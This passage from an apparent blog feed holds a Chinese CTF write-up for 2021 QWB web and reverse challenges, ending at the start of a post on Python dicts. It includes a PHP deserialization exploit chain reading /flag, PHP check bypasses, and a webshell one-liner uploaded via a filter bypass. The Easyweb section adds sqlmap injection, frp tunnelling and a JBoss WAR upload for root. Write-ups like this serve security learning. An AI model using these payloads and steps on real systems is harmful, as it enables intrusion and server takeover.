<span class="token keyword">return</span> i<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">:</span>pos <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getmMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    mflag <span class="token operator">=</span> <span class="token number">0</span>    mtmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> method <span class="token keyword">in</span> i<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''if "public function " in i:                print("get defination:" )                print(i)                break'''</span>            <span class="token keyword">if</span> <span class="token string">"->"</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"("</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get invocation in line "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mflag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                mVar <span class="token operator">=</span> getmVar<span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span>                tmflag <span class="token operator">=</span> mflag                <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                    <span class="token triple-quoted-string string">'''if mVar + " = " + mVar in mtmp:                        s = ""                        ifexp = lines[tmflag]                        ifexpnum = re.findall("[(](.*?)[)]", ifexp)                        s = s.join(ifexpnum)                        if eval(s):                            print("var has been polluted by method 's ifexp")                            print(ifexp)                            print("----------------------")                            return'''</span>                    <span class="token keyword">if</span> mVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    mtmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tmflag<span class="token punctuation">]</span>                    tmflag <span class="token operator">-=</span> <span class="token number">1</span>                mpos <span class="token operator">=</span> mtmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>                mMethod <span class="token operator">=</span> mtmp<span class="token punctuation">[</span>mpos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>mpos <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"method's method is "</span><span class="token operator">+</span>mMethod<span class="token punctuation">)</span>                <span class="token keyword">if</span> mMethod <span class="token operator">!=</span> <span class="token string">"U710q7"</span><span class="token punctuation">:</span>                    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> mMethod<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get!!!!!!!!!"</span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        mflag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">geteMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> tflag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        <span class="token comment"># 查找是否有直接赋值污染变量</span>        <span class="token keyword">if</span> eVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 查找是否有if语句后污染变量</span>        <span class="token triple-quoted-string string">'''if eVar+" = "+eVar+"." in tmp:            s = ""            ifexp = lines[tflag]            ifexpnum = re.findall("[(](.*?)[)]", ifexp)            s = s.join(ifexpnum)            if eval(s):                print("var has been polluted by ifexp")                print("----------------------")                return'''</span>        tmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tflag<span class="token punctuation">]</span>        tflag <span class="token operator">-=</span> <span class="token number">1</span>    mpos <span class="token operator">=</span> tmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>    method <span class="token operator">=</span> tmp<span class="token punctuation">[</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eval's method is "</span> <span class="token operator">+</span> method<span class="token punctuation">)</span>    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No FOUND"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geteVar</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    epos <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">[</span>epos <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">:</span>epos <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">geteval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-------------------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get eval in line"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", total:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>                eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eVar is "</span> <span class="token operator">+</span> eVar<span class="token punctuation">)</span>                geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>                num <span class="token operator">+=</span> <span class="token number">1</span>            flag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>            epos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>            eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>            <span class="token keyword">break</span>        flag<span class="token operator">+=</span><span class="token number">1</span>geteval<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag{42a17bce-75b3-4e4e-a073-e5ec1bb4a218}</p><h2 id="赌徒-done-Err0r"><a href="#赌徒-done-Err0r" class="headerlink" title="赌徒 | done | Err0r"></a>赌徒 | done | Err0r</h2><p>扫目录发现<code>www.zip</code></p><p>发现是反序列化，exp：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give you flag : "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-></span> <span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接读<code>/flag</code></p><p>解码得flag</p><img src="/article/2021qwb/image-20210613212339286-4170472.png" class="" title="image-20210613212339286" loading="lazy"><h2 id="寻宝-SOLVED-Err0r"><a href="#寻宝-SOLVED-Err0r" class="headerlink" title="寻宝 | SOLVED | Err0r"></a>寻宝 | SOLVED | Err0r</h2><h2 id="信息一"><a href="#信息一" class="headerlink" title="信息一"></a>信息一</h2><p>绕就完事，要求能过<code>is_numeric</code>函数，利用变量覆盖赋值</p><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p><code>$num1 &gt; 1024</code></p><p>直接<code>1025a</code>即可</p><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p><code>isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000</code></p><p>科学计数法绕过<code>9e9</code></p><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p><code>isset($num3) &amp;&amp; &#39;4bf21cd&#39; === substr(md5($num3),0,7)</code></p><p>爆md5<code>61823470</code></p><h3 id="第四层"><a href="#第四层" class="headerlink" title="第四层"></a>第四层</h3><p><code>!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4)</code></p><p>直接<code>aaaaaaa</code></p><h3 id="第五层"><a href="#第五层" class="headerlink" title="第五层"></a>第五层</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"第五层"</span><span class="token punctuation">;</span>                                    <span class="token keyword">include</span> <span class="token string single-quoted-string">'KeY1lhv.php'</span><span class="token punctuation">;</span>                                    <span class="token keyword">echo</span> <span class="token variable">$KEY1</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span></code></pre><p>随便输个<code>a</code>过了…</p><p>拿到KEY1<code>KEY1&#123;e1e1d3d40573127e9ee0480caf1283d6&#125;</code></p><h2 id="信息二"><a href="#信息二" class="headerlink" title="信息二"></a>信息二</h2><p>下载发现一大堆docx文档，估计在文档里找KEY2，写脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# -*- coding: utf-8 -*-@File: findkey2.py@Author: gyy@Time: 6月 13, 2021"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">show_files</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 首先遍历当前目录所有文件及文件夹</span>    file_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># 准备循环判断每个元素是否是文件夹还是文件，是文件的话，把名称传入list，是文件夹的话，递归</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        <span class="token comment"># 利用os.path.join()方法取得路径全名，并存入cur_path变量，否则每次只能遍历一层目录</span>        cur_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># 判断是否是文件夹</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            show_files<span class="token punctuation">(</span>cur_path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">".doc"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            all_files<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> all_files<span class="token comment"># 传入空的list接收文件名</span>contents <span class="token operator">=</span> show_files<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 循环打印show_files函数返回的文件名列表</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"KEY"</span> <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIND IT!!!!!\n"</span><span class="token operator">+</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nALL DONE!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>得到</p><pre class="language-plain" data-language="plain"><code class="language-plain">['xxx', 'xxx', 'KEY2&#123;T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS&#125;', 'xxx', 'xxx', 'xxx', 'xxx', 'xxx', 'xxx', 'xxx']</code></pre><p>然后提交KEY1和KEY2得flag</p><img src="/article/2021qwb/image-20210613213530156-4170508.png" class="" title="image-20210613213530156" loading="lazy"><h2 id="Easyweb-SOLVED-D0gekong"><a href="#Easyweb-SOLVED-D0gekong" class="headerlink" title="Easyweb | SOLVED | D0gekong"></a>Easyweb | SOLVED | D0gekong</h2><p>打开网址发现有三个东西，查看源码</p><img src="/article/2021qwb/image-20210613213721349-4170518.png" class="" title="image-20210613213721349" loading="lazy"><p>发现路由，都下载下来，有用的hint，其他没用</p><pre class="language-plain" data-language="plain"><code class="language-plain">Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee</code></pre><p>nmap爆端口</p><img src="/article/2021qwb/image-20210613213837935-4170530.png" class="" title="image-20210613213837935" loading="lazy"><p>得到36842端口，访问发现是登陆界面，给了表名 应该就是注入，试了下发现有回显报错，直接sqlmap跑</p><p>用户名：admin</p><p>密码：99f609527226e076d668668582ac4420</p><p>登陆成功</p><p>扫描发现<code>/file</code>路由有文件上传</p><img src="/article/2021qwb/image-20210614132600977-4170551.png" class="" title="image-20210614132600977" loading="lazy"><p><code>.php</code>绕过过滤</p><p>然后<code>./.php?1=shell.php&amp;2=&lt;?php eval($_POST[1]);?&gt;</code></p><p>连上shell，需要提权。扫进程和端口，没啥收获，最终应该是打JAVA的jboss</p><p>frp穿出来，根据文章<a href="https://blog.csdn.net/weixin_43999372/article/details/88364032">https://blog.csdn.net/weixin_43999372&#x2F;article&#x2F;details&#x2F;88364032</a></p><p>制作war包，上传后拿到root，读取根目录flag：</p><p>flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h1><h2 id="Easymath-SOLVED-Hn13"><a href="#Easymath-SOLVED-Hn13" class="headerlink" title="Easymath | SOLVED | Hn13"></a>Easymath | SOLVED | Hn13</h2><p>将字符串两个一组拆分并做short int传入函数判断相等，dbl数组用于比较。跟进去sub_13f3函数。</p><p>经过多组数据测试发现v3(i+1)与v(i)近似相等，因此v3 &#x3D; 2.718281828459045 - (double)i * v3两边的v3可以看作近似相等，(i+1)v3&#x3D;2.718281828459045，但是由于循环传入的值不能取得，因此相比答案i的值应该进一步-1，即(flag+2)*dbl&#x3D;e,flag&#x3D;e&#x2F;dbl-2，然后int端序与字符相反，再反一下即可得到正确答案。</p><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> mathsegs <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0.00009794904266317233</span><span class="token punctuation">,</span><span class="token number">0.00010270456917442</span><span class="token punctuation">,</span><span class="token number">0.00009194256152777895</span><span class="token punctuation">,</span><span class="token number">0.0001090322021913372</span>，<span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001007442677411854</span><span class="token punctuation">,</span><span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001047063607908828</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span><span class="token punctuation">,</span><span class="token number">0.0001046861985862495</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span>，<span class="token number">0.000108992856167966</span><span class="token punctuation">,</span><span class="token number">0.0001006882924839248</span><span class="token punctuation">,</span><span class="token number">0.0001112590796092291</span><span class="token punctuation">,</span><span class="token number">0.0001089841164633298</span><span class="token punctuation">,</span><span class="token number">0.00008468431512187874</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> segs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>脚本跑完直接出flag：flag{saam_dim_gei_lei_jam_caa_sin_laa}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python dict的小发现</title>
      <link href="article/pythondict/"/>
      <url>article/pythondict/</url>
      
        <content type="html"><![CDATA[<p>记录下撸脚本的时候处理数据用到dict时的有趣发现</p><span id="more"></span><p>字典是另一种可变容器模型，且可存储任意类型对象。</p><p>先上</p><h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: dicttest.py@Author: gyy@Time: 6月 08, 2021"""</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">resttask</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"剩余任务：%d 个"</span> <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    rest <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>        rest<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span 